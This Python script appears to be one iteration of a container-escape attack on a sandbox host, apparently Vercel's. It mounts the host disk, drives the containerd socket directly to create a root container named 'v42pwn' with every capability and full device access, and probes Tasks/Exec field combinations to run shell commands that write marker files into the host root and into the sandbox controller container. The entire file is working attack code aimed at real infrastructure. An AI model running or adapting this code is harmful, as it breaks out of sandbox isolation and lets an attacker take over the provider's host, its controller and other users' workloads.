# -*- coding: utf-8 -*-
"""vda42_exec_probe: 合法编码字段语义探测 (v41 确认 f3 是 string 且长度>127 触发 UTF-8 错)
v41 结论: f1=container_id, f7=exec_id(格式验证, 合法字符通过), f2/f3=string, f4/f5/f6=varint
         T0 的 shim 崩溃会清掉 task 记录 -> 每轮测试前重建 task
P0: mount
P1: list -> ctrl id
P2: create v42pwn + task + start
P3: task 健康检查 + 重建 helper
P4: 组合探测 (全部合法 UTF-8, 每轮前确保 task 健康):
  A: f1+f7+f2('sh -c echo v42-ok > /mnt/root/.v42_marker')
  B: A + f4+f5+f6
  C: f1+f7+f3(同样命令) + f4+f5+f6
  D: f1+f7+f2+f3 组合
  E: f2 变体 ('/bin/sh' vs 完整命令) + bools
  每轮记录 status/msg, 若 ttrpc closed/not found -> 重建 task 再继续
P5: 若某组合 shim 接受 -> Start 尝试 -> 验证 marker
P6: 对 ctrl 容器尝试最佳组合
输出落盘 + 哨兵 V42S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v42s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:300]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v42pwn'
EXID = 'ex42a'


def p1():
    log('=== P1 list ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    m = re.search(rb'\$([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', out)
    ctrl = m.group(1).decode() if m else None
    log('ctrl container id = %s' % ctrl)
    return ctrl


def make_spec(args):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    return {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V42_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v42pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }


def p2():
    log('=== P2 Create v42pwn ===')
    spec = make_spec(["/bin/sh", "-c", "sleep 99999"])
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=6)
    log('Containers/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    return make_task()


def make_task():
    """重建 task (容器记录已存在)"""
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=8)
    ok = 'grpc-status: 0' in rc
    log('Tasks/Create %s' % (rc if ok else rc))
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
        log('Tasks/Start %s' % rc)
        ok = 'grpc-status: 0' in rc
    return ok


def task_ok():
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    return b'v42pwn' in out


def classify(rc):
    m = re.search(r'grpc-status: (\d+)', rc)
    s = m.group(1) if m else '?'
    m = re.search(r'grpc-message: ([^|]*)', rc)
    msg = m.group(1).strip() if m else ''
    return s, msg


def run_exec(tag, body, t=8):
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(body), t=t)
    s, msg = classify(rc)
    log('%-16s status=%s msg=%s' % (tag, s, msg[:130]))
    return rc, out, s, msg


def ensure_task(tag):
    if not task_ok():
        log('%s: task missing, rebuilding' % tag)
        make_task()
        time.sleep(1)


def p4():
    log('=== P4 combo probe ===')
    CMD = 'sh -c "echo v42-ok $(date) >> /mnt/root/.v42_marker 2>/dev/null; sleep 2"'
    tests = [
        ('A f2cmd',       pstr(1, CID) + pstr(7, EXID) + pstr(2, CMD)),
        ('B f2+bools',    pstr(1, CID) + pstr(7, EXID) + pstr(2, CMD) + pbool(4, True) + pbool(5, True) + pbool(6, True)),
        ('C f3cmd',       pstr(1, CID) + pstr(7, EXID) + pstr(3, CMD) + pbool(4, True) + pbool(5, True) + pbool(6, True)),
        ('D f2+f3',       pstr(1, CID) + pstr(7, EXID) + pstr(2, '/bin/sh') + pstr(3, CMD) + pbool(4, True) + pbool(5, True) + pbool(6, True)),
        ('E f2short',     pstr(1, CID) + pstr(7, EXID) + pstr(2, '/bin/sh') + pbool(4, True) + pbool(5, True) + pbool(6, True)),
        ('F f2+f3short',  pstr(1, CID) + pstr(7, EXID) + pstr(2, '/bin/sh') + pstr(3, '-c') + pbool(4, True) + pbool(5, True) + pbool(6, True)),
        ('G f2+f3full',   pstr(1, CID) + pstr(7, EXID) + pstr(2, '/bin/sh') + pstr(3, CMD)),
    ]
    for tag, body in tests:
        ensure_task(tag)
        rc, out, s, msg = run_exec(tag, body)
        if s == '0':
            log('*** %s SUCCESS ***' % tag)
            return tag
        time.sleep(1)
        # 检查 marker (若 shim 接受但连接断, marker 可能已写)
        try:
            mk = '/mnt/vdax/root/.v42_marker'
            if os.path.exists(mk):
                log('*** MARKER WRITTEN by %s: %s ***' % (tag, open(mk).read().strip()))
                return tag
        except Exception:
            pass
    return None


def p5(ok_tag):
    log('=== P5 start attempt ===')
    try:
        mk = '/mnt/vdax/root/.v42_marker'
        if os.path.exists(mk):
            log('marker final: %s' % open(mk).read().strip())
            return
    except Exception:
        pass
    # Exec 已成功创建 exec 进程? 尝试 Start
    for sf in [2, 7]:
        ensure_task('start-sf%d' % sf)
        req = pstr(1, CID) + pstr(sf, EXID) if sf != 1 else pstr(1, EXID)
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
        s, msg = classify(rc)
        log('Start(sf=%d) status=%s msg=%s' % (sf, s, msg[:100]))
        time.sleep(2)
        try:
            mk = '/mnt/vdax/root/.v42_marker'
            if os.path.exists(mk):
                log('*** MARKER WRITTEN after Start(sf=%d): %s ***' % (sf, open(mk).read().strip()))
                return
        except Exception:
            pass


def p6(ctrl, ok_tag):
    log('=== P6 ctrl exec ===')
    if not ctrl:
        log('no ctrl, skip')
        return
    CMD = 'sh -c "echo v42-ctrl-ok $(date) >> /mnt/root/.v42_ctrl_marker 2>/dev/null; sleep 2"'
    body = pstr(1, ctrl) + pstr(7, EXID) + pstr(2, CMD) + pbool(4, True) + pbool(5, True) + pbool(6, True)
    rc, out, s, msg = run_exec('ctrl exec', body)
    if s == '0':
        for sf in [2, 7]:
            req = pstr(1, ctrl) + pstr(sf, EXID)
            rc2, out2 = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
            s2, msg2 = classify(rc2)
            log('ctrl Start(sf=%d) status=%s msg=%s' % (sf, s2, msg2[:100]))
            time.sleep(2)
            try:
                mk = '/mnt/vdax/root/.v42_ctrl_marker'
                if os.path.exists(mk):
                    log('*** CTRL MARKER WRITTEN: %s ***' % open(mk).read().strip())
                    return
            except Exception:
                pass


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    ctrl = p1()
    ok = p2()
    if ok:
        ok_tag = p4()
        if ok_tag:
            p5(ok_tag)
        p6(ctrl, ok_tag)
    else:
        log('v42pwn create failed, skip')

    log('V42S_DONE')
    f.close()


if __name__ == '__main__':
    main()
